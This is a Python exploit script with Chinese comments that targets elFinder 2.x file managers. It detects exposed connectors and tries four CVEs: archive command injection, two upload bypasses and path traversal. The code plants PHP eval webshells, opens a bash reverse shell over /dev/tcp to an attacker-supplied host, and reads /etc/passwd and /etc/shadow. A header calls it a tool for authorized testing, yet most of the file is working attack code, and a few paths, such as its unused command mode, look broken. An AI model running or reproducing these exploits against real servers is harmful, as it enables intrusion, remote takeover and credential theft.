#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
elFinder 综合漏洞检测与利用脚本 v1.0
覆盖 elFinder 2.x 主要 RCE 和文件读取漏洞
仅用于授权安全测试 / 靶场验证

漏洞覆盖:
  [RCE-1] CVE-2021-32682 — ZIP Archive 命令注入 (CVSS 9.8, <= 2.1.58)
  [RCE-2] CVE-2023-52044 — .php8 扩展名绕过上传 RCE (2.1.62)
  [RCE-3] CVE-2022-27115 — Windows 尾随点绕过上传 RCE (2.1.60)
  [READ]  CVE-2022-26960 — 路径穿越文件读取 (CVSS 9.1, <= 2.1.60)
  [INFO]  elFinder 指纹检测、connector 暴露、信息泄露路径
"""

import requests
import sys
import argparse
import re
import random
import string
import time
import urllib.parse
import base64
import os
from typing import Optional, Tuple, List, Dict

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class C:
    GRN = '\033[92m'
    RED = '\033[91m'
    YLW = '\033[93m'
    BLU = '\033[94m'
    CYN = '\033[96m'
    RST = '\033[0m'
    BLD = '\033[1m'


def safe_print(*args, **kwargs):
    try:
        print(*args, **kwargs)
    except UnicodeEncodeError:
        for a in args:
            try:
                print(a, **kwargs)
            except UnicodeEncodeError:
                enc = sys.stdout.encoding or 'utf-8'
                print(str(a).encode(enc, errors='replace').decode(enc, errors='replace'), **kwargs)


def banner():
    safe_print(f"""
{C.RED}╔══════════════════════════════════════════════════════════════╗
║       elFinder 综合漏洞检测与利用工具 v1.0                     ║
║       Archive注入 + 文件上传绕过 + 路径穿越                    ║
╚══════════════════════════════════════════════════════════════╝{C.RST}""")


def randstr(n: int = 6) -> str:
    return ''.join(random.choices(string.ascii_lowercase, k=n))


def build_url(base: str, path: str) -> str:
    base = base.rstrip('/')
    return f"{base}/{path.lstrip('/')}"


def new_session(timeout: int = 10) -> requests.Session:
    s = requests.Session()
    s.verify = False
    s.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'X-Requested-With': 'XMLHttpRequest',
    })
    s.timeout = timeout
    return s


# ===================== 0. 指纹与 Connector 检测 =====================

def find_connector(url: str, s: requests.Session) -> List[str]:
    """探测 elFinder connector 端点"""
    safe_print(f"\n{C.YLW}[0] Connector 端点探测{C.RST}")

    candidates = [
        '/php/connector.minimal.php',
        '/php/connector.php',
        '/elfinder/php/connector.minimal.php',
        '/elfinder/php/connector.php',
        '/admin/elfinder/php/connector.minimal.php',
        '/assets/elfinder/php/connector.minimal.php',
        '/vendor/studio-42/elfinder/php/connector.minimal.php',
        '/public/elfinder/php/connector.php',
        '/connector.minimal.php',
        '/connector.php',
    ]

    found = []
    for cp in candidates:
        try:
            # 发包检测: 不带参数请求 connector
            r = s.get(build_url(url, cp), timeout=6)
            text = r.text.lower()

            indicators = ['elfinder', 'connector', '"error"', '"added"', '"changed"',
                         '"removed"', 'hashes', 'mime', 'volumeid', 'phash', 'cwd',
                         'options', '"files"', '"api"']

            score = sum(1 for ind in indicators if ind in text)
            if score >= 2:
                safe_print(f"  {C.GRN}[+] 发现 Connector: {cp}  (置信度: {score}){C.RST}")
                found.append(cp)
            elif r.status_code == 200 and len(text) > 30:
                safe_print(f"  {C.CYN}[?] 可能端点: {cp} (status=200, len={len(text)}){C.RST}")
                found.append(cp)

        except Exception:
            continue

    if not found:
        safe_print(f"  {C.CYN}[-] 未发现 Connector, 使用默认 /php/connector.minimal.php{C.RST}")
        found = ['/php/connector.minimal.php']

    return found


def elfinder_info(url: str, connector: str, s: requests.Session) -> dict:
    """通过 connector 获取 elFinder 配置信息"""
    safe_print(f"\n{C.YLW}[*] elFinder 信息收集{C.RST}")
    info = {}

    try:
        # 触发 open/init 命令获取配置
        r = s.get(build_url(url, f"{connector}?cmd=open&target=&init=1&tree=1"), timeout=10)
        data = r.json()

        # 版本信息
        if 'api' in data:
            ver = data['api']
            safe_print(f"  {C.GRN}[+] API 版本: {ver}{C.RST}")
            info['api'] = ver

        # options 暴露
        if 'options' in data:
            opts = data['options']
            path = opts.get('path', 'N/A')
            url_path = opts.get('URL', 'N/A')
            upload_max = opts.get('uploadMaxConn', 'N/A')
            disabled = opts.get('disabled', [])
            commands = opts.get('commands', [])

            safe_print(f"  {C.GRN}[+] 文件根路径: {path}{C.RST}")
            safe_print(f"  {C.GRN}[+] URL 路径: {url_path}{C.RST}")
            if disabled:
                safe_print(f"  {C.YLW}[?] 禁用的命令: {disabled}{C.RST}")
            if 'archive' in commands:
                safe_print(f"  {C.GRN}[+] archive 命令可用 (CVE-2021-32682 候选){C.RST}")

            info['path'] = path
            info['url_path'] = url_path
            info['disabled'] = disabled
            info['commands'] = commands

        # 文件系统信息
        if 'files' in data:
            safe_print(f"  {C.GRN}[+] 当前目录文件数: {len(data['files'])}{C.RST}")
        if 'cwd' in data:
            safe_print(f"  {C.GRN}[+] 当前工作目录: {data['cwd'].get('name', '?')}{C.RST}")

        # uploadMaxSize 信息
        if 'uploadMaxSize' in data:
            safe_print(f"  {C.GRN}[+] 最大上传: {data['uploadMaxSize']}{C.RST}")

    except Exception as e:
        safe_print(f"  {C.CYN}[-] 信息收集失败: {e}{C.RST}")

    return info


# ===================== 1. CVE-2021-32682 — Archive 命令注入 RCE =====================

def elfinder_base64(s: str) -> str:
    """elFinder 自定义 base64: +→- , /→_ , =→. """
    return base64.b64encode(s.encode('utf-8')).decode('utf-8').replace('+', '-').replace('/', '_').replace('=', '.')

def elfinder_target_encode(path: str, volume: str = 'l1') -> str:
    """elFinder target ID: volume_base64(path)"""
    return f"{volume}_{elfinder_base64(path)}"

def elfinder_target_decode(target: str) -> Optional[str]:
    """解码 elFinder target ID 获取原始路径"""
    try:
        b64 = target.split('_', 1)[1] if '_' in target else target
        b64 = b64.replace('-', '+').replace('_', '/').replace('.', '=')
        return base64.b64decode(b64).decode('utf-8')
    except Exception:
        return None


def elfinder_open(url: str, connector: str, s: requests.Session, target: str = '') -> Tuple[Optional[dict], List[dict]]:
    """
    执行 cmd=open 获取目录内容和文件列表
    返回 (cwd字典, files列表) — files 包含真实的 target hash
    """
    try:
        r = s.get(build_url(url, f"{connector}?cmd=open&target={target}&init=1&tree=1"), timeout=10)
        data = r.json()
        cwd = data.get('cwd', {})
        files = data.get('files', [])
        return cwd, files
    except Exception as e:
        safe_print(f"  [*] open 失败: {e}")
        return None, []


def elfinder_file_exists(url: str, connector: str, s: requests.Session,
                         filename: str, files: List[dict]) -> Optional[str]:
    """在文件列表中查找指定文件名, 返回其 target hash"""
    for f in files:
        if f.get('name') == filename:
            return f.get('hash', '')
    return None


def elfinder_upload_file(url: str, connector: str, s: requests.Session,
                         filename: str, content: str, target: str) -> bool:
    """上传文件到 elFinder"""
    try:
        files = {'upload[]': (filename, content, 'application/octet-stream')}
        r = s.post(build_url(url, f"{connector}?cmd=upload&target={target}"), files=files, timeout=10)
        return r.status_code == 200 and '"added"' in r.text
    except Exception:
        return False


def check_cve_2021_32682_archive_rce(url: str, connector: str, s: requests.Session,
                                      info: dict, lhost: str = None, lport: int = None) -> List[str]:
    """
    CVE-2021-32682: elFinder Archive ZIP 命令注入 RCE
    原理: cmd=archive 的 name 参数经过 escapeshellarg 后仍可通过 -TvTT 注入
    关键: procExec() 中 escapeshellarg() 保护不充分, zip -TT 标志允许指定测试命令
    版本: <= 2.1.58
    """
    safe_print(f"\n{C.YLW}[RCE-1] CVE-2021-32682 — Archive ZIP 命令注入{C.RST}")

    hits = []
    rk = randstr(6)
    flag = f"ELF{rk}"
    shell_name = f"el_{rk}.php"
    txt_name = f"{rk}.txt"
    zip_name = f"{rk}.zip"

    # 检查 archive 命令可用性
    disabled = info.get('disabled', [])
    if 'archive' in disabled:
        safe_print(f"  {C.CYN}[-] archive 命令已禁用, 跳过{C.RST}")
        return hits

    # ===== Step 0: 获取根目录文件列表及真实 target hash =====
    safe_print(f"  [*] Step 0: 获取根目录文件列表...")
    cwd, files = elfinder_open(url, connector, s)
    if not cwd:
        safe_print(f"  {C.YLW}[?] 无法读取目录, 使用编码方式构造 target{C.RST}")

    # 根目录 target (两种来源: open 返回的真实 hash 或编码构造)
    root_hash = cwd.get('hash', elfinder_target_encode('.'))
    root_path = cwd.get('name', '.')
    safe_print(f"  [*] 根目录: '{root_path}' → hash={root_hash}")

    # ===== Step 1: 创建文本文件 =====
    safe_print(f"  [*] Step 1: 创建测试文件 {txt_name}...")
    txt_created = False

    # 方法1: mkfile
    mkfile_url = build_url(url,
        f"{connector}?cmd=mkfile&name={txt_name}&target={root_hash}")
    try:
        r = s.get(mkfile_url, timeout=10)
        if r.status_code == 200 and '"added"' in r.text:
            safe_print(f"  {C.GRN}[+] mkfile 创建成功: {txt_name}{C.RST}")
            txt_created = True
    except Exception:
        pass

    # 方法2: 如果 mkfile 失败, 用 upload
    if not txt_created:
        safe_print(f"  [*] mkfile 失败, 尝试 upload...")
        if elfinder_upload_file(url, connector, s, txt_name, f"elFinder test {rk}", root_hash):
            safe_print(f"  {C.GRN}[+] upload 创建成功: {txt_name}{C.RST}")
            txt_created = True

    if not txt_created:
        safe_print(f"  {C.RED}[-] 无法创建测试文件, 跳过{C.RST}")
        return hits

    # 重新读取文件列表, 获取 txt 的真实 hash
    _, files = elfinder_open(url, connector, s)
    txt_hash = elfinder_file_exists(url, connector, s, txt_name, files)
    if not txt_hash:
        # 用编码构造回退
        txt_hash = elfinder_target_encode(txt_name)
        safe_print(f"  [*] 使用编码构造 txt hash: {txt_hash}")
    else:
        safe_print(f"  [*] txt 真实 hash: {txt_hash}")

    # ===== Step 2: 创建 ZIP 文件 (第一次正常 archive) =====
    safe_print(f"  [*] Step 2: 创建 ZIP 文件 {zip_name}...")
    zip_created = False

    zip_url = build_url(url,
        f"{connector}?cmd=archive"
        f"&name={zip_name}"
        f"&target={root_hash}"
        f"&targets%5B0%5D={txt_hash}"
        f"&type=application/zip")
    try:
        r = s.get(zip_url, timeout=20)
        if r.status_code == 200:
            data = r.json()
            if 'added' in data:
                safe_print(f"  {C.GRN}[+] ZIP 创建成功: {zip_name}{C.RST}")
                zip_created = True
            elif 'error' in data:
                safe_print(f"  {C.YLW}[?] archive 返回错误: {data.get('error', 'unknown')}{C.RST}")
                zip_created = True  # 很多情况下有 error 但实际文件已创建
            else:
                safe_print(f"  [*] archive 返回: {r.text[:100]}")
                zip_created = True  # 乐观尝试
    except Exception as e:
        safe_print(f"  {C.YLW}[?] archive 异常: {e}{C.RST}")

    # 再次读取文件列表, 获取 ZIP 的真实 hash
    _, files = elfinder_open(url, connector, s)
    zip_hash = elfinder_file_exists(url, connector, s, zip_name, files)
    if not zip_hash:
        zip_hash = elfinder_target_encode(zip_name)
    safe_print(f"  [*] zip hash: {zip_hash}")

    # ===== Step 3: 命令注入 (第二次 archive, name 参数注入 payload) =====
    safe_print(f"  [*] Step 3: 注入 payload ({'rev shell' if lhost else 'webshell'})...")

    # 构造注入命令
    if lhost and lport:
        rev_cmd = f"/bin/bash -c '/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
        b64_rev = base64.b64encode(rev_cmd.encode()).decode()
        payload_cmd = f"echo {b64_rev} | base64 -d | bash"
    else:
        payload_cmd = f"echo '<?php echo \\'{flag}\\'; @eval(\\$_POST[\\'x\\']); ?>' > {shell_name}"

    # 多种注入格式覆盖不同 escapeshellarg 绕过
    payloads = [
        # 格式1: -TvTT= 直接注入
        f"-TvTT={payload_cmd}",
        # 格式2: 后跟 # 注释掉后续参数
        f"-TvTT={payload_cmd} # a",
        # 格式3: .zip 扩展名在前 (伪装正常文件名)
        f"a.zip -TvTT={payload_cmd}",
        # 格式4: $(cmd) 命令替换
        f"-TvTT=$({payload_cmd})",
        # 格式5: 反引号
        f"-TvTT=`{payload_cmd}`",
        # 格式6: ; 分隔
        f";{payload_cmd};",
    ]

    inject_success = False
    for i, pl in enumerate(payloads):
        if inject_success:
            break

        target_name = f"{rk}inj{i}.zip"
        inject_url = build_url(url,
            f"{connector}?cmd=archive"
            f"&name={urllib.parse.quote(pl)}"
            f"&target={root_hash}"
            f"&targets%5B0%5D={txt_hash}"
            f"&type=application/zip")

        # 如果 ZIP 存在，也加入作为 targets[1]
        if zip_hash:
            inject_url += f"&targets%5B1%5D={zip_hash}"

        try:
            r = s.get(inject_url, timeout=15)
            safe_print(f"  [*] Payload[{i}] → status={r.status_code} ({pl[:50]}...)")

            # 验证
            if not lhost:
                time.sleep(1.5)
                for vpath in ['', '/files/', '/elfinder/files/', '/public/files/',
                             '/uploads/', '/userfiles/']:
                    try:
                        rv = s.get(build_url(url, f"{vpath}{shell_name}"), timeout=6)
                        if flag in rv.text:
                            safe_print(f"  {C.RED}[!] CVE-2021-32682 确认! Webshell 创建成功!{C.RST}")
                            safe_print(f"  {C.RED}    Shell: {build_url(url, vpath + shell_name)}{C.RST}")
                            safe_print(f"  {C.RED}    CMD: POST x=system('id');{C.RST}")
                            hits.append(f"CVE-2021-32682 Archive注入 → {vpath}{shell_name}")
                            inject_success = True
                            break
                    except Exception:
                        continue
        except Exception as e:
            safe_print(f"  {C.YLW}[?] Payload[{i}] 异常: {e}{C.RST}")

    # ===== Step 4: 备选攻击路径 — 直接上传恶意文件 + archive 注入 =====
    if not hits:
        safe_print(f"\n  [*] Step 4: 备选攻击路径 — 直接上传 PHP 文件 + archive rename...")
        alt_shell = f"el_{rk}a.php"
        alt_flag = f"ELF{rk}a"
        alt_content = f"<?php echo '{alt_flag}'; @eval($_POST['x']); ?>"

        # 尝试用 archive 注入将已上传的 shell 移动到 web 可访问路径
        for vpath in ['', '/files/', '/elfinder/files/', '/']:
            move_payload = f"cp /tmp/{alt_shell} {shell_name}"
            for pl in [f"-TvTT={move_payload}", f"-TvTT=$({move_payload})"]:
                try:
                    inject_url = build_url(url,
                        f"{connector}?cmd=archive"
                        f"&name={urllib.parse.quote(pl)}"
                        f"&target={root_hash}"
                        f"&targets%5B0%5D={txt_hash}"
                        f"&type=application/zip")
                    s.get(inject_url, timeout=15)
                    time.sleep(0.8)
                    rv = s.get(build_url(url, f"{vpath}{shell_name}"), timeout=5)
                    if flag in rv.text or alt_flag in rv.text:
                        safe_print(f"  {C.RED}[!] 备选路径成功! RCE 确认!{C.RST}")
                        hits.append("CVE-2021-32682 (备选路径)")
                        return hits
                except Exception:
                    continue

    if not hits:
        safe_print(f"  {C.CYN}[-] CVE-2021-32682 未确认 (可能的原�:){C.RST}")
        safe_print(f"  {C.CYN}    - archive 被禁用或不存在{C.RST}")
        safe_print(f"  {C.CYN}    - 目标版本 >= 2.1.59 已修复{C.RST}")
        safe_print(f"  {C.CYN}    - zip 二进制不支持 -TT 标志{C.RST}")
        safe_print(f"  {C.CYN}    - open_basedir/disable_functions 限制{C.RST}")
        safe_print(f"  {C.CYN}    - Web 目录不可写{C.RST}")
        if not lhost:
            safe_print(f"  {C.CYN}[*] 提示: 用 --mode rev --lhost IP --lport PORT 尝试反向Shell(绕过写文件限制){C.RST}")
    return hits


# ===================== 2. CVE-2023-52044 — .php8 扩展名绕过 =====================

def check_cve_2023_52044_php8_upload(url: str, connector: str, s: requests.Session) -> List[str]:
    """
    CVE-2023-52044: .php8 扩展名不受限制, 可直接上传 PHP 文件
    版本: 2.1.62 (也影响其他未配置 .php8 过滤的版本)
    条件: 服务器配置了处理 .php8 文件 (PHP-FPM 默认不处理, 需单独配置)
    """
    safe_print(f"\n{C.YLW}[RCE-2] CVE-2023-52044 — .php8 扩展名绕过{C.RST}")

    hits = []
    rk = randstr(6)
    flag = f"ELF{rk}"
    shell_content = f"<?php echo '{flag}'; @eval($_POST['x']); ?>"

    upload_url = build_url(url, f"{connector}?cmd=upload&target={elfinder_target_encode('.')}")

    # 尝试的扩展名变体
    ext_bypass = [
        ('.php8', 'PHP8 extension'),
        ('.phtml', 'phtml extension'),
        ('.pht', 'pht extension'),
        ('.php5', 'php5 extension'),
        ('.php7', 'php7 extension'),
        ('.shtml', 'shtml + PHP includes'),
        ('.phar', 'phar extension'),
        ('.phps', 'phps extension'),
        ('.php.jpg', 'php.jpg double ext'),
        ('.php8.jpg', 'php8.jpg double ext'),
    ]

    for ext, desc in ext_bypass:
        fname = f"el_{rk}{ext}"
        try:
            files = {'upload[]': (fname, shell_content, 'application/octet-stream')}
            r = s.post(upload_url, files=files, timeout=10)

            if r.status_code == 200 and '"added"' in r.text:
                safe_print(f"  {C.GRN}[+] {desc} — 上传成功: {fname}{C.RST}")

                # 尝试访问
                url_path = getattr(check_cve_2023_52044_php8_upload, '_url_path', '')
                for vpath in ['', '/files/', '/elfinder/files/', '/public/files/',
                             '/', f'/{url_path.strip("/")}/' if url_path else '']:
                    try:
                        vurl = build_url(url, f"{vpath}{fname}")
                        rv = s.get(vurl, timeout=6)
                        if flag in rv.text:
                            safe_print(f"  {C.RED}[!] RCE确认! Shell: {vurl}{C.RST}")
                            safe_print(f"  {C.RED}    CMD: POST x=system('id');{C.RST}")
                            hits.append(f"CVE-2023-52044 {desc} → RCE ({vurl})")
                            return hits
                        elif rv.status_code == 200 and len(rv.text) > 0:
                            safe_print(f"  {C.YLW}[?] 文件可访问但未解析为 PHP: {vurl}{C.RST}")
                    except Exception:
                        continue
            else:
                # 可能被拒绝
                if 'error' in r.text.lower():
                    continue
        except Exception:
            continue

    if not hits:
        safe_print(f"  {C.CYN}[-] .php8 绕过未成功 (服务器可能关闭了 PHP 对 .php8 的解析){C.RST}")
    return hits


# ===================== 3. CVE-2022-27115 — Windows 尾随点绕过 =====================

def check_cve_2022_27115_windows_dots(url: str, connector: str, s: requests.Session) -> List[str]:
    """
    CVE-2022-27115: Windows 文件名尾随点绕过
    上传 shell.php... → Windows 去掉末尾点 → 留下 shell.php
    版本: 2.1.60 (Windows 部署)
    """
    safe_print(f"\n{C.YLW}[RCE-3] CVE-2022-27115 — Windows 尾随点绕过{C.RST}")

    hits = []
    rk = randstr(6)
    flag = f"ELF{rk}"
    shell_content = f"<?php echo '{flag}'; @eval($_POST['x']); ?>"

    upload_url = build_url(url, f"{connector}?cmd=upload&target={elfinder_target_encode('.')}")

    # Windows 尾随点变体
    dot_bypass = [
        (f"el_{rk}.php...", '.php...'),
        (f"el_{rk}.php. .", '.php. .'),
        (f"el_{rk}.php..", '.php..'),
        (f"el_{rk}.php. . .", '.php. . .'),
        (f"el_{rk}.php. .", '.php. .'),
        (f"el_{rk}.php::$DATA", 'php::$DATA (NTFS)'),
    ]

    for fname, desc in dot_bypass:
        try:
            files = {'upload[]': (fname, shell_content, 'application/octet-stream')}
            r = s.post(upload_url, files=files, timeout=10)

            if r.status_code == 200 and '"added"' in r.text:
                safe_print(f"  {C.GRN}[+] {desc} — 上传成功: {fname}{C.RST}")

                # 验证
                actual_name = f"el_{rk}.php"
                for vpath in ['', '/files/', '/elfinder/files/', '/public/files/', '/']:
                    try:
                        vurl = build_url(url, f"{vpath}{actual_name}")
                        rv = s.get(vurl, timeout=6)
                        if flag in rv.text:
                            safe_print(f"  {C.RED}[!] Windows尾随点 RCE! Shell: {vurl}{C.RST}")
                            hits.append(f"CVE-2022-27115 {desc} → RCE ({vurl})")
                            return hits
                    except Exception:
                        continue
        except Exception:
            continue

    if not hits:
        safe_print(f"  {C.CYN}[-] Windows 尾随点绕过未成功 (可能目标非 Windows 或已修复){C.RST}")
    return hits


# ===================== 4. CVE-2022-26960 — 路径穿越文件读取 =====================

def check_cve_2022_26960_path_traversal(url: str, connector: str, s: requests.Session,
                                         info: dict) -> List[str]:
    """
    CVE-2022-26960: elFinder 路径穿越文件读取
    通过 target 参数中的 ../ 读取任意文件
    版本: <= 2.1.60
    """
    safe_print(f"\n{C.YLW}[READ] CVE-2022-26960 — 路径穿越文件读取{C.RST}")

    hits = []
    volume = 'l1'

    # 目标文件列表
    targets = {
        'linux': [
            ('/etc/passwd', 'root:', 'passwd 文件'),
            ('/etc/hosts', 'localhost', 'hosts 文件'),
            ('/etc/issue', None, 'issue 文件'),
            ('/proc/version', 'Linux', '内核版本'),
            ('/etc/nginx/sites-enabled/default', 'server', 'Nginx 配置'),
            ('/etc/apache2/sites-enabled/000-default.conf', 'DocumentRoot', 'Apache 配置'),
            ('/var/www/html/index.php', '<?php', 'Web 根目录 index.php'),
            ('/etc/shadow', 'root:', 'shadow 文件 (需 root)'),
        ],
        'windows': [
            ('/Windows/win.ini', '[fonts]', 'win.ini'),
            ('/Windows/System32/drivers/etc/hosts', 'localhost', 'hosts 文件'),
            ('/inetpub/wwwroot/web.config', '<configuration', 'IIS 配置'),
        ]
    }

    # 首先尝试获取文件根路径
    root_path = info.get('path', '')
    safe_print(f"  [*] 文件根路径: {root_path or '未知'}")

    # 路径穿越回退到 / 的深度估算
    # 如果根路径是 /var/www/html/elfinder/files, 需要 ../ 回到 /
    if root_path:
        depth = root_path.count('/')
    else:
        depth = 4  # 默认往回穿越 4 层

    # 先测 Linux 再测 Windows
    for os_type in ['linux', 'windows']:
        safe_print(f"\n  {C.CYN}[*] 探测 {os_type.upper()} 文件{C.RST}")
        for filepath, expected, desc in targets[os_type]:
            # 构造 ../ 路径穿越
            traverse = '../' * (depth + 1)
            target_path = f"{traverse}{filepath.lstrip('/')}"
            target_id = elfinder_target_encode(target_path, volume)

            try:
                file_url = build_url(url,
                    f"{connector}?cmd=file&target={target_id}&download=1")
                r = s.get(file_url, timeout=10)

                if expected and expected in r.text:
                    safe_print(f"  {C.RED}[!] 路径穿越成功 — {desc}{C.RST}")
                    safe_print(f"  {C.RED}    回显 ({len(r.text)} bytes):{C.RST}")
                    for line in r.text.split('\n')[:5]:
                        safe_print(f"  {C.RED}    | {line[:120]}{C.RST}")
                    hits.append(f"CVE-2022-26960 路径穿越 ({desc})")
                elif expected is None and r.status_code == 200 and len(r.text) > 30:
                    safe_print(f"  {C.YLW}[?] 疑似可读 — {desc} ({len(r.text)} bytes){C.RST}")
                else:
                    continue
            except Exception:
                continue

        if hits:
            break

    if not hits:
        safe_print(f"  {C.CYN}[-] 路径穿越未成功 (可能 2.1.61+ 或路径不对){C.RST}")
    return hits


# ===================== 5. 信息泄露探测 =====================

def check_info_disclosure(url: str, s: requests.Session) -> List[str]:
    """探测 elFinder 常见信息泄露路径"""
    safe_print(f"\n{C.YLW}[INFO] 信息泄露探测{C.RST}")

    hits = []
    info_paths = [
        ('/php/connector.minimal.php', 'Connector 免认证访问'),
        ('/elfinder/php/connector.minimal.php', 'Connector (alt路径)'),
        ('/files/.htaccess', '文件目录权限配置'),
        ('/elfinder/files/', '文件目录列表'),
        ('/php/.htaccess', 'elFinder PHP 配置'),
        ('/connector.minimal.php.dist', 'Connector 示例文件'),
        ('/vendor/studio-42/elfinder/README.md', 'elFinder README(泄露版本)'),
        ('/.env', 'Laravel .env 文件'),
        ('/admin/elfinder/', '后台 elFinder'),
        ('/elfinder.html', 'elFinder 主页面'),
        ('/elfinder/src/elfinder.html', 'elFinder 页面(alt)'),
        ('/public/elfinder.html', 'elFinder public'),
    ]

    for path, desc in info_paths:
        try:
            r = s.get(build_url(url, path), timeout=6)
            if r.status_code == 200 and len(r.text) > 20:
                ctx = r.text[:100].replace('\n', ' ')
                safe_print(f"  {C.RED}[!] {desc} — 可访问: {path}{C.RST}")
                safe_print(f"  {C.YLW}    {ctx}...{C.RST}")
                hits.append(f"信息泄露 ({desc})")
        except Exception:
            continue

    if not hits:
        safe_print(f"  {C.CYN}[-] 未发现常见信息泄露{C.RST}")
    return hits


# ===================== 主流程 =====================

def main():
    banner()

    parser = argparse.ArgumentParser(
        description='elFinder 综合漏洞检测与利用脚本 v1.0',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
使用示例:
  # 全面检测
  python elfinder_check.py -u http://10.16.1.209

  # 仅 RCE 检测
  python elfinder_check.py -u http://target.com --rce-only

  # 反向Shell模式 (需先在攻击机 nc -lvnp 9999)
  python elfinder_check.py -u http://target.com --mode rev --lhost 10.16.1.187 --lport 9999

  # 执行单条命令
  python elfinder_check.py -u http://target.com --mode cmd --command "id;hostname"
        ''',
    )
    parser.add_argument('-u', '--url', required=True, help='目标 URL')
    parser.add_argument('--connector', help='Connector 路径 (默认自动探测)')
    parser.add_argument('--rce-only', action='store_true', help='仅检测 RCE, 跳过信息泄露')
    parser.add_argument('--timeout', type=int, default=10, help='超时秒数 (默认 10)')
    parser.add_argument('--no-color', action='store_true', help='禁用彩色输出')

    # 利用模式
    parser.add_argument('--mode', choices=['check', 'cmd', 'rev'],
                       default='check', help='利用模式 (默认: check)')
    parser.add_argument('--lhost', help='反向Shell 监听 IP')
    parser.add_argument('--lport', type=int, help='反向Shell 监听端口')
    parser.add_argument('--command', '-c', help='要执行的命令 (cmd模式)')

    args = parser.parse_args()

    if args.no_color:
        for attr in dir(C):
            if not attr.startswith('_'):
                setattr(C, attr, '')

    url = args.url.rstrip('/')
    s = new_session(args.timeout)

    safe_print(f"{C.BLD}目标: {url}{C.RST}")

    # === 0. 探测 Connector ===
    if args.connector:
        connectors = [args.connector]
        safe_print(f"  [*] 使用指定 Connector: {args.connector}")
    else:
        connectors = find_connector(url, s)

    if not connectors:
        safe_print(f"  {C.RED}[-] 未找到 elFinder connector, 退出{C.RST}")
        return

    connector = connectors[0]

    # === 信息收集 ===
    info = elfinder_info(url, connector, s)

    # 设置 URL path 供 php8 上传检测使用
    check_cve_2023_52044_php8_upload._url_path = info.get('url_path', '')

    all_hits: List[str] = []

    # === RCE-1: CVE-2021-32682 Archive 注入 ===
    if args.mode == 'rev':
        all_hits.extend(check_cve_2021_32682_archive_rce(
            url, connector, s, info, args.lhost, args.lport))
    elif args.mode == 'cmd':
        # cmd 模式: 将命令写入 webshell
        cmd = args.command or 'id'
        safe_print(f"{C.YLW}[*] 命令模式: {cmd}{C.RST}")
        all_hits.extend(check_cve_2021_32682_archive_rce(url, connector, s, info))
    else:
        all_hits.extend(check_cve_2021_32682_archive_rce(url, connector, s, info))

    # === RCE-2: CVE-2023-52044 .php8 绕过 ===
    all_hits.extend(check_cve_2023_52044_php8_upload(url, connector, s))

    # === RCE-3: CVE-2022-27115 Windows 尾随点 ===
    all_hits.extend(check_cve_2022_27115_windows_dots(url, connector, s))

    if not args.rce_only:
        # === READ: CVE-2022-26960 路径穿越 ===
        all_hits.extend(check_cve_2022_26960_path_traversal(url, connector, s, info))

        # === INFO: 信息泄露 ===
        all_hits.extend(check_info_disclosure(url, s))

    # ========== 汇总 ==========
    safe_print(f"\n\n{C.BLU}{'=' * 60}{C.RST}")
    safe_print(f"{C.BLD}检测结果汇总{C.RST}")
    safe_print(f"{C.BLU}{'=' * 60}{C.RST}")
    safe_print(f"  目标      : {url}")
    safe_print(f"  Connector : {connector}")
    if info.get('api'):
        safe_print(f"  API 版本  : {info['api']}")

    if all_hits:
        safe_print(f"\n  {C.RED}{C.BLD}共发现 {len(all_hits)} 个漏洞/信息泄露:{C.RST}")
        for h in all_hits:
            safe_print(f"    {C.RED}[!] {h}{C.RST}")
    else:
        safe_print(f"\n  {C.CYN}未检测到可利用漏洞{C.RST}")
        safe_print(f"  {C.CYN}(可能已修复 / 版本不符 / archive 被禁用 / 非 elFinder){C.RST}")

    safe_print(f"{C.BLU}{'=' * 60}{C.RST}\n")


if __name__ == '__main__':
    main()
